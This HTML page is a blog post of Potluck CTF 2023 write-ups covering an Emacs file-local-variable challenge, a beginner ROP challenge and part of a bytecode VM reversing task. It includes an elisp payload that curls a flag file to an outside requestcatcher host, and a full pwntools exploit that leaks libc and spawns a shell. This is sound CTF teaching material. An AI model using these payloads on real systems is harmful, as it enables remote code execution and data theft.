@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Potluck CTF 2023 Write-Ups | poni’s blog</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="Potluck CTF 2023 Write-Ups" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Intro Potluck CTF was a very exciting new CTF event made by ZetaTwo, and we were eager to participate. In essence, a new idea it brought to the table was that to join the competition each participating team had to create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that’s the plan). We didn’t solved much and participated in a more casual way but since I made a chall there I decided to make a write-up for it and with it for some of the other challenges I solved." />
+<meta property="og:description" content="Intro Potluck CTF was a very exciting new CTF event made by ZetaTwo, and we were eager to participate. In essence, a new idea it brought to the table was that to join the competition each participating team had to create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that’s the plan). We didn’t solved much and participated in a more casual way but since I made a chall there I decided to make a write-up for it and with it for some of the other challenges I solved." />
+<link rel="canonical" href="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/emacs/2023/12/29/Potluck-CTF-Writeups.html" />
+<meta property="og:url" content="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/emacs/2023/12/29/Potluck-CTF-Writeups.html" />
+<meta property="og:site_name" content="poni’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-29T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Potluck CTF 2023 Write-Ups" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-12-29T00:00:00+00:00","datePublished":"2023-12-29T00:00:00+00:00","description":"Intro Potluck CTF was a very exciting new CTF event made by ZetaTwo, and we were eager to participate. In essence, a new idea it brought to the table was that to join the competition each participating team had to create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that’s the plan). We didn’t solved much and participated in a more casual way but since I made a chall there I decided to make a write-up for it and with it for some of the other challenges I solved.","headline":"Potluck CTF 2023 Write-Ups","mainEntityOfPage":{"@type":"WebPage","@id":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/emacs/2023/12/29/Potluck-CTF-Writeups.html"},"url":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/emacs/2023/12/29/Potluck-CTF-Writeups.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://poniponiponiponiponiponiponiponiponi.github.io/feed.xml" title="poni&apos;s blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">poni&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/about/software">Software I use and why</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Potluck CTF 2023 Write-Ups</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-12-29T00:00:00+00:00" itemprop="datePublished">Dec 29, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="intro">Intro</h1>
+<p>Potluck CTF was a very exciting new CTF event made by ZetaTwo, and we were eager to participate. In essence, a new idea it brought to the table was that to join the competition each participating team had to create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that’s the plan). We didn’t solved much and participated in a more casual way but since I made a chall there I decided to make a write-up for it and with it for some of the other challenges I solved.</p>
+
+<h1 id="emacro-wave-cooking">Emacro-wave Cooking</h1>
+<p>First we will look at the challenge made by me. It only had 6 solves with a lot of top teams participating but I wouldn’t call it hard, it’s more of a difficulty by obscurity rather than by complexity. If I had to guess the Emacs community is slowly dying out, plus it’s not a popular choice in the infosec community compared for example to the more scientific/academic communities. We’re given a <code class="language-plaintext highlighter-rouge">chall.py</code> and some other files but they exist only to simulate a victim opening a file we send them in Emacs with the following config:</p>
+<div class="language-elisp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nb">defvar</span> <span class="nv">cooking-motivation-generator</span>
+  <span class="o">'</span><span class="p">(</span><span class="k">let*</span> <span class="p">((</span><span class="nv">random-number</span> <span class="p">(</span><span class="nb">random</span> <span class="mi">3</span><span class="p">))</span>
+	  <span class="p">(</span><span class="nv">messages</span> <span class="o">'</span><span class="p">(</span><span class="s">"Never give up!"</span>
+		      <span class="s">"Do the impossible, see the invisible!"</span> 
+		      <span class="s">"Believe in me that believes in you!"</span><span class="p">))</span>
+	  <span class="p">(</span><span class="nv">random-message</span> <span class="p">(</span><span class="nb">nth</span> <span class="nv">random-number</span> <span class="nv">messages</span><span class="p">)))</span>
+     <span class="p">(</span><span class="nv">message</span> <span class="nv">random-message</span><span class="p">)))</span>
+<span class="p">(</span><span class="nv">make-variable-buffer-local</span> <span class="ss">'cooking-motivation-generator</span><span class="p">)</span>
+<span class="p">(</span><span class="nv">put</span> <span class="ss">'cooking-motivation-generator</span> <span class="ss">'safe-local-variable</span> <span class="p">(</span><span class="k">lambda</span> <span class="p">(</span><span class="nv">_</span><span class="p">)</span> <span class="no">t</span><span class="p">))</span>
+<span class="p">(</span><span class="nv">run-with-timer</span> <span class="mi">2</span> <span class="mi">2</span> <span class="p">(</span><span class="k">lambda</span> <span class="p">()</span> <span class="p">(</span><span class="nb">eval</span> <span class="nv">cooking-motivation-generator</span><span class="p">)))</span>
+</code></pre></div></div>
+<p>The idea is that Emacs will look at commented lines at the beginning and end of a file. Those comments can overwrite variables inside of Emacs. This can lead to a more customized user experience but can also lead to a potential security risk. I think you can see where this is going to? Luckily we can mark variables as unsafe or safe. For unsafe variables we are first asked if we want to execute them, safe variables are executed automatically. In the config file we are creating a variable, marking it as safe with <code class="language-plaintext highlighter-rouge">(put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))</code> and then it’s <code class="language-plaintext highlighter-rouge">eval</code>ed. Therefore the solution is to achieve RCE and read the flag. You can read more about local variables in files and <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs/File-Variables.html">it’s safety there</a>. This is my solve.py that will send the flag to a requestcatcher link:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">recipe</span> <span class="o">=</span> <span class="s">"""# Local Variables:
+# cooking-motivation-generator: (shell-command (concat "curl -X POST -d </span><span class="se">\\</span><span class="s">"" (with-temp-buffer (insert-file-contents "/app/flag.txt") (buffer-string)) "</span><span class="se">\\</span><span class="s">" https://nyaaa.requestcatcher.com/test"))
+# End:
+"""</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">recipe</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">recipe</span><span class="p">.</span><span class="n">encode</span><span class="p">()))</span>
+<span class="c1">#io = remote("0.0.0.0", 31337)
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challenge13.play.potluckctf.com"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"! "</span><span class="p">,</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">recipe</span><span class="p">.</span><span class="n">encode</span><span class="p">()))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>If you never programmed in emacs-lisp the way we read the file may appear weird, but oh well…
+One tricky thing that I intentionally left in was that the above code would not work if we used single quotes instead of double quotes cuz the flag contained a one single quote inside. I wonder if anyone was catched off guard by it. :P</p>
+
+<h1 id="ezrop">Ezrop</h1>
+<p>This is a beginner pwn chall with a small ‘twist’ if you even can call it that. There’s some setup code and then everything interesting happens inside the <code class="language-plaintext highlighter-rouge">vuln</code> function. There’s a disassembly of it:</p>
+<pre><code class="language-asm">   0x00000000004011db &lt;+0&gt;:	endbr64
+   0x00000000004011df &lt;+4&gt;:	push   rbp
+   0x00000000004011e0 &lt;+5&gt;:	mov    rbp,rsp
+   0x00000000004011e3 &lt;+8&gt;:	sub    rsp,0x20
+   0x00000000004011e7 &lt;+12&gt;:	lea    rax,[rip+0xe16]        # 0x402004
+   0x00000000004011ee &lt;+19&gt;:	mov    rdi,rax
+   0x00000000004011f1 &lt;+22&gt;:	mov    eax,0x0
+   0x00000000004011f6 &lt;+27&gt;:	call   0x401060 &lt;printf@plt&gt;
+   0x00000000004011fb &lt;+32&gt;:	lea    rax,[rbp-0x20]
+   0x00000000004011ff &lt;+36&gt;:	mov    rdi,rax
+   0x0000000000401202 &lt;+39&gt;:	mov    eax,0x0
+   0x0000000000401207 &lt;+44&gt;:	call   0x401070 &lt;gets@plt&gt;
+   0x000000000040120c &lt;+49&gt;:	nop
+   0x000000000040120d &lt;+50&gt;:	leave
+   0x000000000040120e &lt;+51&gt;:	ret
+</code></pre>
+<p>We call printf with a hardcoded string and then we call gets. The binary doesn’t have ALSR turned on and we have an obvious buffer overflow so we can return back to the binary. The question is where do we return to? There are no <code class="language-plaintext highlighter-rouge">pop rdi</code> gadgets inside of the binary so this is not an option. Turns out that while returning from this function the string we wrote to in <code class="language-plaintext highlighter-rouge">gets</code> is inside of the rax register so we can return back to before the printf is called to achieve a string format vulnerability.</p>
+<pre><code class="language-asm">   0x00000000004011ee &lt;+19&gt;:	mov    rdi,rax
+   0x00000000004011f1 &lt;+22&gt;:	mov    eax,0x0
+   0x00000000004011f6 &lt;+27&gt;:	call   0x401060 &lt;printf@plt&gt;
+</code></pre>
+<p>It’s dictated by the Linux ABI that rdi is the first argument of any function, so we move our string to rdi and then we call <code class="language-plaintext highlighter-rouge">printf</code> with it. We use the string format vuln to achieve a libc leak and then we write a trivial rop chain giving us a shell. One thing to watch out is that we also overwrite the rbp while overflowing so it needs to be set to a writeable memory segment. I set it to <code class="language-plaintext highlighter-rouge">0x404a00</code>. If we use an address “too close to the border from the left” the stack will overflow below 0x404000 and we will segfault because this memory is not writeable, so you need to watch out for that. This is my whole solution:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ezrop_patched"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-2.35.so"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'split_emacsclient.fish'</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challenge19.play.potluckctf.com"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s">"""
+            set follow-fork-mode parent
+            """</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ee</span><span class="p">)</span>
+    <span class="n">fmt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"%p "</span> <span class="o">*</span> <span class="p">(</span><span class="mi">32</span><span class="o">//</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">rbp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404a00</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmt</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">rbp</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"0x"</span><span class="p">)</span>
+    <span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">).</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mi">2202272</span>
+
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+    <span class="n">rop</span><span class="p">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">ret</span><span class="p">)</span>
+    <span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'system'</span><span class="p">,</span> <span class="p">[</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))])</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span>
+    
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="schrödingers-p1g">Schrödinger’s P1G</h1>
+<p>In this challenge we basically get a custom bytecode interpreter that we will be exploiting. Luckily for us the binary is not stripped so the reversing will be somewhat trivial. Let’s start then with reversing! First let’s look at the <code class="language-plaintext highlighter-rouge">main</code> function decompilation. There’s some initialization code, mostly nothing interesting for us. We can see there that using <code class="language-plaintext highlighter-rouge">stdout</code> as the arguments will make the program read the code from stdin (which is confusing but whatever).</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="n">param_2</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">is_stdout</span><span class="p">;</span>
+  
+  <span class="n">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">param_2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="s">"stdout"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">is_stdout</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">is_stdout</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">param_2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">is_stdout</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: Open failed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>Then the code is read, parsed and runned:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">__buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x20000</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">is_stdout</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="mh">0x20000</span><span class="p">);</span>
+    <span class="n">parser</span><span class="p">(</span><span class="n">__buf</span><span class="p">);</span>
+    <span class="n">vmRun</span><span class="p">();</span>
+    <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</code></pre></div></div>
+<p>One thing to notice about how our input is read is that it’s just one call to <code class="language-plaintext highlighter-rouge">read</code>. This makes it annoying to play around with cuz we can’t use the shell for interacting with the program because a shell will stop reading when it encounters a newline and the program expects a bunch of newlines. Instead we need to use pwntools or maybe pipeing. Anyway, let’s first look into how it’s ran and after that how it’s parsed.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vmRun</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">thread_i</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">pthread_t</span> <span class="n">threads</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">mcode_count</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">thread_i</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">pthread_create</span><span class="p">(</span><span class="n">threads</span> <span class="o">+</span> <span class="n">i</span><span class="p">,(</span><span class="n">pthread_attr_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="n">vm</span><span class="p">,</span><span class="n">thread_i</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="n">mcode_count</span><span class="p">;</span> <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pthread_join</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="n">j</span><span class="p">],(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Looks like we can create a bunch of threads, each thread will run it’s own instructions with with the <code class="language-plaintext highlighter-rouge">vm</code> function. Later turns out the threads are mostly to look scary and we will <em>almost</em> not use them at all. From what the author wrote post ctf the intended solution was much more complex and the threads actually mattered there but oh well. Alright, now let’s look at the parsing that will transform the instructions we give the program into custom bytecode.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">parser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar2</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_68</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_60</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_58</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_50</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_48</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_40</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_28</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>
+  
+  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_58</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">local_58</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">local_50</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_60</span><span class="p">);</span>
+    <span class="n">local_38</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">", "</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_60</span><span class="p">);</span>
+    <span class="n">local_48</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">", "</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_60</span><span class="p">);</span>
+    <span class="n">local_30</span> <span class="o">=</span> <span class="n">local_48</span><span class="p">;</span>
+    <span class="n">local_40</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">", "</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_60</span><span class="p">);</span>
+    <span class="n">local_28</span> <span class="o">=</span> <span class="n">local_40</span><span class="p">;</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_50</span><span class="p">,</span><span class="s">"thread"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">mcode_count</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: Too many thread</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x17</span><span class="p">);</span>
+        <span class="n">err</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">mcode_count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">mcode_count</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
+      <span class="n">pvVar2</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10000</span><span class="p">);</span>
+      <span class="p">(</span><span class="o">&amp;</span><span class="n">mcode</span><span class="p">)[</span><span class="n">iVar1</span><span class="p">]</span> <span class="o">=</span> <span class="n">pvVar2</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">mcode_count</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: There is no thread</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">);</span>
+      <span class="n">err</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">generate_mcode</span><span class="p">(</span><span class="n">local_50</span><span class="p">,</span><span class="n">local_38</span><span class="p">,</span><span class="n">local_30</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+    <span class="p">}</span>
